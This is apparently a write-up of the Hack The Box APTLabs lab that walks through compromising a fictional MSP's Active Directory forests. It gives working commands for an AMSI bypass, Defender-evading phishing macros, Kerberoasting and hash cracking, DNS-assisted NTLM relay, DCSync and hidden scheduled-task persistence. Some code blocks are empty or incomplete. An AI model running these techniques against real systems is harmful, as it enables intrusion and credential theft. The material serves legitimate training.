🏛 Lab Overview

APTLabs is the hardest Pro Lab on Hack The Box, rated Red Team Operator Level 3. The scenario puts you in the shoes of an external threat actor targeting a Managed Service Provider (MSP) called VantagePoint Solutions. The MSP manages IT infrastructure for multiple client organizations, which means compromising the MSP gives you a launchpad into their clients' networks as well. The entire lab contains 18 machines spread across three Active Directory forests: the MSP's own forest and two client forests. There are 20 flags to collect, and crucially, no CVE exploitation is required or even possible. Every compromise must come from abuse of misconfigurations, credential-based attacks, and Active Directory trust exploitation.

The lab resets completely every 24 hours, wiping all shells, pivots, and cached credentials. This sounds brutal, but it actually works in your favor because it means the environment is extremely stable and every attack works reliably once you figure out the correct path. After my first couple of days, I developed a repeatable re-compromise script that could get me back to where I left off within 30-40 minutes each morning. The daily reset forces you to truly understand the attack chain rather than just fumbling through it once.

The flag names themselves provide hints about the intended attack path, which I found extremely helpful when I was stuck. Multiple paths exist to some flags, and the order isn't always linear, so don't be afraid to jump around if you hit a wall. I spent roughly 8 days of active work to complete the entire lab, with the first 3 days just getting comfortable with the network topology and establishing reliable initial access.

No CVE Exploitation

The entire network is compromised without exploiting any CVEs. No public exploit scripts, no buffer overflows, no known vulnerability exploitation. Every compromise comes from abuse of legitimate features, misconfigurations, or credential-based attacks. This design forces you to think and operate like a real APT actor rather than running exploit modules from a framework.

⏰ Daily Reset Strategy

The lab resets completely every 24 hours. All progress is lost.
This is the single most important operational constraint. Every morning, you start from scratch.

The daily reset is the defining characteristic of APTLabs and the primary reason why operational efficiency and automation are critical. Unlike other Pro Labs where progress persists, APTLabs reverts every machine to its original state daily. Any shells, pivots, cached credentials, and persistence mechanisms are completely wiped. However, if you dump the right hashes and save them locally, you can get back to the same point relatively quickly without re-running all the attacks. I treat this as a feature, not a bug: the reset guarantees a stable environment where attacks work reliably every time.

My Daily Recovery Workflow

After a few days of manual re-compromise, I developed a repeatable workflow that gets me from zero to Domain Admin on the MSP forest in under 30 minutes each morning. The key is to save all critical artifacts before the reset hits, then use those artifacts for rapid re-establishment. Here is the exact workflow I followed:

Before Reset (Save Phase)
Dump all domain hashes via DCSync. Save krbtgt hash, all service account hashes, and local admin hashes from each machine. Export BloodHound data. Document your attack path order and which credentials work on which machines. Save C2 listener configs and payload templates locally.
+0 min — Re-send Phishing
Fire the phishing email using the pre-built template. The macro document is already crafted and tested, so this is a one-click operation. Wait for the beacon callback (usually 2-5 minutes).
+5 min — Re-establish C2
Once the beacon calls back on VP-WS01, apply AMSI bypass and load your post-exploitation modules. The host is clean after reset, so Defender signatures haven't seen your payloads yet.
+10 min — Over-Pass-the-Hash
Use the saved svc_backup NTLM hash from yesterday's Kerberoast to over-pass-the-hash to VP-SRV01. No need to re-kerberoast; the hashes don't change between resets.
+20 min — DCSync
From VP-SRV01 (which has replication permissions via the SCCM service account), run DCSync against VP-DC01. You now have full domain hash dump again, including krbtgt.
+30 min — Continue Where Left Off
With Domain Admin on vantagepoint.local restored, continue from where you stopped the day before. For me, this was usually the forest trust phase.

🏳 Phase 1: Initial Access

T1566.001 T1059.005 T1027 T1204.002

Initial access in APTLabs is achieved through a phishing campaign that delivers a weaponized Office document with a macro payload. The target is hmartinez, a Help Desk Technician at VantagePoint Solutions. The phishing scenario makes sense in the MSP context: Help Desk staff are accustomed to opening attachments from external sources (vendor updates, support tickets, etc.), making them ideal phishing targets.

OSINT & Target Selection

Before crafting the phishing email, I gathered information about VantagePoint Solutions from the lab's initial context. The key insight is that MSP employees regularly interact with external parties: vendors send them software updates, clients submit support tickets, and partners share documents. The phishing email needs to blend into this workflow. I crafted a lure pretending to be a network monitoring vendor sending a firmware update notification, which is the kind of email a Help Desk tech would open without suspicion.

The target selection is straightforward: Help Desk Technician hmartinez is the most logical initial target because this role requires opening external documents regularly and typically has enough privileges to be useful for internal reconnaissance, but not so much that the account would have enhanced security monitoring. BloodHound later confirmed that hmartinez has local admin rights on VP-WS01 (their own workstation), which provides a beachhead for further operations.

Crafting the Phishing Document

The weaponized document is a macro-enabled Office document (.docm) that executes a staged payload upon opening. The macro uses VBA shell execution to download and run a Cobalt Strike beacon from the C2 infrastructure. The critical challenge is that the lab environment runs Microsoft Defender, which will flag and quarantine naive macro payloads. I went through three iterations before achieving reliable delivery.

Bypassing Microsoft Defender

The lab incorporates modern Windows security features that will detect naive payload delivery. I needed to implement evasion at multiple layers to achieve reliable execution. The key techniques that worked for me were macro obfuscation combined with VBA stomping, AMSI bypass, and staged payload delivery.

Macro Obfuscation: Variable name randomization, string concatenation (you can see this in the VBA code above where "powershell" is split into three variables), and logic branching to defeat static analysis. The goal is to make the VBA source code look benign to any scanner that examines the document before macros are enabled.

VBA Stomping: This technique removes the VBA source code from the document while leaving the compiled p-code intact. Many AV scanners only examine the VBA source code, so stomping effectively blinds them while the macro still executes correctly. I used the evilclippy tool for this purpose, which allows you to replace the VBA source with benign comments while the compiled p-code remains functional.

AMSI Bypass: Before loading any .NET assemblies or executing PowerShell scripts through the beacon, I patch the Anti-Malware Scan Interface in memory. This forces AMSI to always return a "clean" result, allowing subsequent .NET tool execution (Rubeus, SharpHound, etc.) without triggering Defender.

powershell 
# AMSI Bypass — Execute before loading any .NET tools
# Force amsiInitFailed flag to prevent AMSI scanning

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
    .GetField('amsiInitFailed','NonPublic,Static')`
    .SetValue($null,$true)

# Verify bypass worked
Write-Host "AMSI bypass applied successfully"
Multiple Iterations Required

My first phishing document was immediately quarantined by Defender. The second one executed the macro but the PowerShell cradle was flagged. The third attempt (with string concatenation obfuscation + VBA stomping + staged delivery) worked reliably. Don't get discouraged if your first payload doesn't land. The daily reset actually helps here because you can iterate quickly.

C2 Infrastructure Setup

I used Cobalt Strike as my primary C2 framework throughout the entire lab. The SOCKS proxy feature in CS simplified my life on multiple occasions, especially for pivoting between network segments during lateral movement. I also tested Covenant briefly but found CS's built-in post-exploitation capabilities (hashdump, pth, dcsync) more streamlined for this environment.

C2 infrastructure setup consists of three components: the Team Server running on a VPS, a Malleable C2 profile that blends beacon traffic with legitimate HTTP patterns, and a redirector that obscures the true C2 IP address. For APTLabs, I used a basic redirector setup with a compromised web server acting as a traffic proxy to the Team Server.

bash 
# Cobalt Strike Team Server Setup
# ============================================

# Start team server with operational profile
./teamserver 10.10.14.5 MyStr0ngP@ss! /opt/c2profiles/WEB20.profile

# Malleable C2 Profile Key Settings:
# - HTTP/S beaconing with 40-60s sleep + 35% jitter
# - URI rotation: /search, /update, /api/v2/health
# - User-Agent matching Chrome on Windows 10
# - Custom headers: Accept, Accept-Language, Cookie
# - SSL certificate for redirector domain

# Listener Configuration
# Primary: HTTPS beacon to redirector
# Secondary: SMB beacon for internal pivot
# Tertiary: DNS beacon for low-profile C2
CS SOCKS Proxy is Essential

Set up a SOCKS proxy through your beacon early. This allows you to use proxychains with BloodHound, Impacket, and other tools from your attacker machine without needing to upload them to the target. In CS: socks 1080 then configure /etc/proxychains4.conf to route through the beacon. This is invaluable for reaching the Meridian and Nexus subnets later.

🔑 Phase 3: Privilege Escalation

T1558.003 T1558.004 T1134 T1110.002

With a beachhead on VP-WS01 and the credentials for both hmartinez and srobertson, the next objective is to escalate privileges within the vantagepoint.local domain. The primary attack vectors are Kerberoasting (targeting service accounts with SPNs), AS-REP Roasting (targeting accounts with DONT_REQ_PREAUTH), and leveraging the ACL misconfigurations discovered through BloodHound. The hash cracking step is critical and requires more than just the Rockyou wordlist.

Kerberoasting

Kerberoasting is the cornerstone privilege escalation technique in APTLabs. By requesting Kerberos TGS tickets for service accounts that have SPNs registered in AD, you receive tickets encrypted with the service account's NTLM hash, which can be cracked offline without any network interaction. This makes it extremely stealthy and very difficult for defenders to detect in real time. I used Rubeus for Kerberoasting, executed through the CS beacon's execute-assembly to avoid disk writes.

powershell 
# Kerberoasting with Rubeus via CS execute-assembly

# Step 1: Enumerate all SPN accounts
execute-assembly /opt/tools/Rubeus.exe kerberoast /stats

# Output shows:
# svc_backup   - MSSQLSvc/VP-BK01.vantagepoint.local:1433 - encryption: RC4
# svc_sccm     - MSSQLSvc/VP-SRV01.vantagepoint.local:1433 - encryption: AES256
# svc_monitor  - No SPN (skip for Kerberoasting, but AS-REP roastable)

# Step 2: Request TGS tickets (RC4 downgrade for easier cracking)
execute-assembly /opt/tools/Rubeus.exe kerberoast /rc4opsec /outfile:C:\Temp\kerb_hashes.txt

# Step 3: Download the hash file
download C:\Temp\kerb_hashes.txt

# Step 4: View the captured hashes
# $krb5tgs$23$*svc_backup$VANTAGEPOINT.LOCAL$MSSQLSvc/VP-BK01...*
# $krb5tgs$23$*svc_sccm$VANTAGEPOINT.LOCAL$MSSQLSvc/VP-SRV01...*

AS-REP Roasting

While enumerating domain users, I noticed that svc_monitor has the DONT_REQ_PREAUTH flag set, making it vulnerable to AS-REP Roasting. This attack doesn't require any authentication — you simply request a Kerberos AS-REP for the account, and the response contains a portion encrypted with the account's NTLM hash. This is even stealthier than Kerberoasting since no authentication is required.

powershell 
# AS-REP Roasting with Rubeus

# Enumerate AS-REP roastable users
execute-assembly /opt/tools/Rubeus.exe asreproast /stats

# Request AS-REP for svc_monitor
execute-assembly /opt/tools/Rubeus.exe asreproast /user:svc_monitor /outfile:C:\Temp\asrep_hashes.txt

# Download the hash
download C:\Temp\asrep_hashes.txt

# Hash format: $krb5asrep$23$svc_monitor@VANTAGEPOINT.LOCAL:...

Hash Cracking — The NotSoSecret Weapon

This is where many operators get stuck. The service account passwords in APTLabs are not simple dictionary words. They follow corporate password patterns like Season+Year+Symbol, CompanyName+Number+Symbol, etc. Straight Rockyou.txt will not crack most of them. You need mutation rules, and the NotSoSecure password cracking rules are the key to success here. Specifically, the OneRuleToRuleThemAll.rule applies comprehensive mutations that cover the common corporate password patterns.

bash 
# Hash Cracking with NotSoSecure Rules
# ============================================

# Download the rules
git clone https://github.com/NotSoSecure/password_cracking_rules
cd password_cracking_rules

# Step 1: Quick dictionary-only attempt (fast, catches weak passwords)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Step 2: If Step 1 fails, apply NotSoSecure mutation rules
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r OneRuleToRuleThemAll.rule --force

# Step 3: Cracking results for my run:
# svc_backup  -> Vant@geP0int2024!  (corporate pattern: Company+Leet+Year+Symbol)
# svc_sccm    -> ScCM_Manage!2023    (product name + symbol + year)
# svc_monitor -> M0nit0ring$2024     (word + leet + symbol + year)

# For AS-REP hash:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r OneRuleToRuleThemAll.rule --force
# svc_monitor cracked with same password from both methods

SMB Relay & DNS Manipulation

One of the more nuanced attacks in APTLabs involves SMB relay combined with DNS manipulation. The scenario is that certain machines perform SMB connections that can be intercepted and relayed, but only if you can manipulate DNS responses to redirect the connections through your relay server. This is a realistic attack that mirrors actual APT operations where operators poison DNS to intercept authentication traffic.

The specific scenario involves VP-APP01 making SMB connections to a server name that resolves through the vantagepoint.local DNS zone. By adding a DNS record that points this server name to my attacker-controlled machine (or by modifying an existing record), I can redirect the SMB authentication through an ntlmrelayx instance and capture the NetNTLM hash or relay it to another machine for authentication.

bash 
# SMB Relay with DNS Manipulation
# ============================================

# Step 1: Using srobertson's credentials, add a DNS record
# that redirects VP-APP01's target to our relay
python3 dnstool.py -u vantagepoint.local\\srobertson \
    -p 'Summ3rVilla2024!' -r update.vantagepoint.local \
    -a add -t A -d 10.10.14.5 VP-DC01

# Step 2: Start ntlmrelayx targeting VP-SRV01
impacket-ntlmrelayx -t smb://10.10.10.40 -smb2support -socks

# Step 3: Trigger the SMB connection from VP-APP01
# (This happens automatically on a schedule, or you can force it)
shell python3 PetitPotam.py 10.10.14.5 10.10.10.50

# Step 4: Captured relay gives us SOCKS proxy to VP-SRV01
# Use the relay to dump SAM/SYSTEM or execute commands

Resource-Based Constrained Delegation (RBCD) Abuse

This was the most satisfying attack in the entire lab. BloodHound revealed that svc_backup has GenericAll privileges on the VP-SRV01$ machine account. This ACL misconfiguration allows us to modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on VP-SRV01, configuring it to trust a machine account that we control. We then use that controlled machine account to obtain a service ticket for VP-SRV01 as any user we want, including a Domain Admin.

The attack proceeds in four steps: (1) Create a new machine account (AD allows any user to add up to 10 machine accounts by default via MachineAccountQuota), (2) Configure RBCD on VP-SRV01 to trust our new machine account, (3) Use our machine account to request a service ticket for VP-SRV01 as Administrator, (4) Use that service ticket to access VP-SRV01 with Domain Admin privileges.

powershell

# ============================================

# Result: 10 (we can add machine accounts)

👑 Phase 5: Domain Domination

DCSync Attack

DCSync is the crown jewel of AD attacks. It exploits the Directory Replication Service (DRS) protocol to simulate a domain controller and request credential data from a real DC. The attack requires an account with replication permissions on the domain (specifically DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). In our case, the svc_sccm service account has these permissions because SCCM requires them for its normal operations. With the cracked credentials for svc_sccm, I can run DCSync to dump the entire NTDS.dit equivalent — every hash in the domain, including the krbtgt hash which is needed for Golden Ticket.

powershell 
# DCSync via Cobalt Strike
# ============================================

# Method 1: Using CS built-in dcsync (from VP-SRV01 beacon)
dcsync vantagepoint.local VP-DC01

# Method 2: Using mimikatz through the beacon
execute-assembly /opt/tools/Rubeus.exe dcsync /user:krbtgt /domain:vantagepoint.local

# Method 3: Using Impacket from attacker machine via SOCKS
proxychains secretsdump.py vantagepoint.local/svc_sccm:'ScCM_Manage!2023'@10.10.10.10 -just-dc-ntlm

# svc_backup: [already known]

Golden Ticket

With the krbtgt hash in hand, I can forge a Kerberos TGT (Ticket Granting Ticket) for any user in the domain, including the built-in Administrator. This is known as a Golden Ticket. The beauty of this attack is that the TGT is signed with the krbtgt hash, so the domain controller will accept it without question. The ticket persists even if the Administrator's password is changed (though it would be invalidated if the krbtgt password is reset twice, which doesn't happen in this lab).

A Silver Ticket is forged using the NTLM hash of a service account (obtained from DCSync or Kerberoasting) rather than the krbtgt hash. Because Silver Tickets only grant access to a specific service on a specific machine, they generate less noise and are less likely to be detected.

🔄 Phase 7: Persistence

T1546 T1136 T1547 T1053

Persistence in APTLabs is somewhat paradoxical because the daily reset wipes everything. However, understanding persistence techniques is still important for two reasons: (1) the lab may test your knowledge of persistence as part of flag objectives, and (2) in a real engagement, persistence is how you maintain access over time. I implemented several persistence mechanisms across all three forests to demonstrate capability, even though they would be wiped at the next reset.

Persistence Techniques Implemented

powershell 
# Persistence Mechanisms (across all 3 forests)
# ============================================

# 1. Scheduled Task Persistence (most reliable)

schtasks /create /tn "WindowsUpdate" /tr "powershell -windowstyle hidden -exec bypass -e " /sc daily /st 09:00 /ru SYSTEM

# 2. Registry Run Key
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SysHealth" /t REG_SZ /d "C:\Windows\Temp\syshealth.exe"

sc start WindowsTelemetry

Daily Reset Note

Remember that all persistence mechanisms are wiped by the daily reset. The only "persistence" that survives is your saved credential file and understanding of the attack path. This is actually a good thing — it means you need to truly understand the techniques rather than just running a script once and relying on persistence to maintain access. In a real engagement, you would combine these techniques with OPSEC considerations to ensure they're difficult to detect and remove.

The key is to exfiltrate data through the C2 channel without triggering any network-based detection mechanisms. Since the lab doesn't have an active Blue Team, the primary concern is ensuring exfiltration blends with normal C2 beacon traffic.

📚 Key Lessons & Takeaways

APTLabs was the most challenging and rewarding lab I've completed. It reinforced several critical lessons about real-world red team operations that I want to emphasize for anyone embarking on this lab.

1. The Daily Reset is Your Friend

At first, the daily reset feels devastating. You spend hours establishing a complex attack chain only to have it wiped overnight. But after a few days, you realize it's actually forcing you to truly internalize the techniques. By Day 5, I could re-compromise the entire vantagepoint.local forest from memory in under 30 minutes. The reset also ensures the environment is always in a clean, predictable state — no corrupted shells or half-applied exploits to deal with. Embrace it, automate your recovery, and use the daily fresh start as an opportunity to refine your tradecraft.

2. BloodHound is Non-Negotiable

With 18 machines across 3 forests and complex trust relationships, you absolutely cannot navigate this lab by intuition alone. BloodHound's shortest path analysis revealed the RBCD attack path, the cross-forest trust abuse opportunities, and the ACL misconfigurations that make the entire chain possible. Run SharpHound early and often, and learn to interpret the graph data effectively. The ACL edges in particular are the key to finding the non-obvious attack paths.

3. Hash Cracking Requires More Than Rockyou

This was the single biggest roadblock in my first two days. The service account passwords follow corporate patterns that straight Rockyou.txt won't crack. The NotSoSecure password cracking rules (specifically OneRuleToRuleThemAll.rule) are essential. They apply mutations like capitalization, number appending, symbol appending, leet speak substitution, and seasonal patterns that cover the vast majority of corporate password policies. If you're stuck on a Kerberoast hash that won't crack, this is almost certainly the missing piece.

4. Cobalt Strike SOCKS Proxy is a Game Changer

The ability to tunnel arbitrary traffic through a beacon's SOCKS proxy means you never need to upload Impacket, BloodHound, or other Python tools to the target. Everything runs on your attacker machine and is transparently routed through the compromised host. This dramatically reduces your footprint on the target network and simplifies the operational workflow. Set up SOCKS on day one and use it throughout.

5. DNS Manipulation Opens Unexpected Doors

The SMB relay attack that requires DNS manipulation is one of the more creative techniques in the lab. Many operators miss this because they don't think to check if their compromised accounts have DNS modification privileges. Always check for DNS admin access when you compromise new accounts — it's a powerful primitive that enables SMB relay, phishing infrastructure, and traffic interception.

6. Credential Reuse Across Forests is Realistic and Common

Finding that jblackwell in nexusfin.local reused the same password as a service account in vantagepoint.local was a realistic touch. MSP environments frequently have credential reuse across client domains, especially for service accounts that need to authenticate across trust boundaries. When you dump domain hashes, always try them against other forests in the environment.

7. Flag Names Are Hints — Use Them

The flag names in APTLabs provide directional hints about the attack path. When I was stuck, I would look at the remaining flag names and think about what technique they were pointing toward. For example, "RBCDCompromise" clearly indicates that RBCD abuse is the intended path to that particular flag. Don't ignore this built-in guidance system.

8. No CVEs Means Thinking, Not Running Scripts

The absence of CVE exploitation forces you to truly understand Active Directory attacks at a deep level. You can't just fire Metasploit and get a shell. Every compromise requires understanding why a particular misconfiguration exists, how to exploit it, and what the resulting access gives you. This is the real value of the lab — it trains operational thinking rather than tool execution.

Final Advice

Don't rush. Take the time to understand each technique before moving on. The daily reset means you'll have multiple opportunities to practice each attack, so use them. By the time you complete all 20 flags, you should be able to execute every technique in this writeup from memory without looking at any reference material. That's the real measure of success — not just collecting the flags, but internalizing the tradecraft.
